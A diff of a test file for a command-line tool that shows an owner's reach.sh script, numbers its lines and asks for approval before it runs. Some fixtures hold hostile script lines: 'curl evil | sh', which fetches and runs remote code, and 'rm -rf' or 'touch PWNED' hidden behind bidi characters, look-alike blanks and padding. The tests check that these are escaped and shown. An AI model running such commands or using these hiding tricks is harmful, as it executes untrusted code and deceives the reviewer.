@@ -20,11 +20,11 @@ import {
   NOT_LEARNED,
   RELEARN_BUSY,
   NOT_YET,
-  RUN_THIS,
+  runThis,
   RUNNING,
   SIGN_IN_HINT,
   STOP,
-  USE_CHANGED,
+  useChanged,
   opener,
   realVisitDeps,
   type VisitOptions,
@@ -105,9 +105,10 @@ test("an owner-written reach.sh is shown whole and runs only once approved", asy
   fs.writeFileSync(paths.script, body, { mode: 0o644 })
   const { deps, prompter, errors } = visitDeps(dir, fake, { answers: ["1"] })
   expect(await visit({ signIn: false, open: false }, deps)).toBe(3)
-  expect(prompter.seen).toContain(`  touch '${marker}'`)
-  expect(prompter.seen).toContain("  exit 3")
-  expect(prompter.seen.filter((line) => line === RUN_THIS)).toHaveLength(1)
+  expect(prompter.seen).toContain(`  1  touch '${marker}'`)
+  expect(prompter.seen).toContain("  3  exit 3")
+  expect(prompter.seen.filter((line) => line === runThis(3))).toHaveLength(1)
+  expect(runThis(3)).toBe("Run this 3-line reach.sh on every visit?")
   expect(fs.readFileSync(paths.approved, "utf8")).toBe(body)
   const access = await readAccess(paths)
   expect(access).toMatchObject({ sha256: sha256(body), port: 49381, signed_in_at: null, last_used_at: null })
@@ -170,7 +171,8 @@ test("a changed reach.sh shows the diff and asks once; no stops the visit", asyn
   const { deps, prompter, errors } = visitDeps(dir, fake, { answers: ["2"] })
   expect(await visit({ signIn: false, open: false }, deps)).toBe(1)
   expect(prompter.seen).toContain(`+touch '${marker}'`)
-  expect(prompter.seen.filter((line) => line === USE_CHANGED)).toHaveLength(1)
+  expect(prompter.seen.filter((line) => line === useChanged(4))).toHaveLength(1)
+  expect(useChanged(4)).toBe("Use the changed 4-line reach.sh on every visit?")
   expect(fs.readFileSync(paths.access, "utf8")).toBe(access)
   expect(fs.readFileSync(paths.approved, "utf8")).toBe(before)
   expect(fs.existsSync(marker)).toBe(false)
@@ -657,9 +659,9 @@ test("a changed reach.sh whose approved copy isn't the approved one is shown who
   fs.writeFileSync(paths.script, "echo one\ncurl evil | sh\nexit 3\n")
   const v = visitDeps(dir, fake, { answers: ["2"] })
   expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
-  expect(v.prompter.seen).toContain("  curl evil | sh")
-  expect(v.prompter.seen).toContain(RUN_THIS)
-  expect(v.prompter.seen).not.toContain(USE_CHANGED)
+  expect(v.prompter.seen).toContain("  2  curl evil | sh")
+  expect(v.prompter.seen).toContain(runThis(3))
+  expect(v.prompter.seen).not.toContain(useChanged(3))
 })
 
 test("bidi and other invisible characters in reach.sh are shown escaped", async () => {
@@ -669,7 +671,7 @@ test("bidi and other invisible characters in reach.sh are shown escaped", async 
   fs.writeFileSync(paths.script, "echo 'safe\u202e; rm -rf x \u2066'\u200b\nexit 3\n")
   const v = visitDeps(dir, fake, { answers: ["2"] })
   expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
-  expect(v.prompter.seen).toContain("  echo 'safe<U+202E>; rm -rf x <U+2066>'<U+200B>")
+  expect(v.prompter.seen).toContain("  1  echo 'safe<U+202E>; rm -rf x <U+2066>'<U+200B>")
 })
 
 test("at a numbered approval question the first Ctrl-C exits 130", async () => {
@@ -684,7 +686,7 @@ test("at a numbered approval question the first Ctrl-C exits 130", async () => {
   // A dumb terminal: the list is numbered and a line answers it, so Ctrl-C reaches the visit as SIGINT.
   const prompter = new TtyPrompter({ input: v.stdin, output: shown, interactive: true, env: { TERM: "dumb" } })
   const done = visit({ signIn: false, open: false }, { ...v.deps, prompter })
-  await waitFor(() => text.includes(`${RUN_THIS} [${STOP}]: `), { what: "the question" })
+  await waitFor(() => text.includes(`${runThis(3)} [${STOP}]: `), { what: "the question" })
   v.sigint()
   expect(await done).toBe(130)
   expect(v.errors).toEqual([])
@@ -888,3 +890,20 @@ test("while learning, login masters stay 10 minutes after their last use; afterw
   expect(fs.readFileSync(paths.config, "utf8")).toContain("\nControlPersist 60\n")
   expect(fs.readFileSync(paths.batchConfig, "utf8")).toContain("\nControlPersist 60\n")
 })
+
+test.each(["\u00a0", "\u202f", "\u3000", "\u2028", "\u2800", "\u3164"])(
+  "an owner-written reach.sh with a look-alike blank is shown escaped, not refused [%p]",
+  async (blank) => {
+    const hex = blank.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0")
+    const { dir, fake } = fakeHome()
+    const paths = new ReachPaths(dir)
+    makeDirs(paths)
+    fs.writeFileSync(paths.script, `echo listing jobs${blank}# ; touch PWNED\n${"\n".repeat(30)}exit 3\n`)
+    const v = visitDeps(dir, fake, { answers: ["2"] })
+    expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+    expect(v.prompter.seen).toContain(`   1  echo listing jobs<U+${hex}># ; touch PWNED`)
+    expect(v.prompter.seen).toContain("      (30 blank lines)")
+    expect(v.prompter.seen).toContain(runThis(32))
+    expect(v.errors).toEqual(["opencorp hq: stopped; reach.sh isn't approved."])
+  },
+)
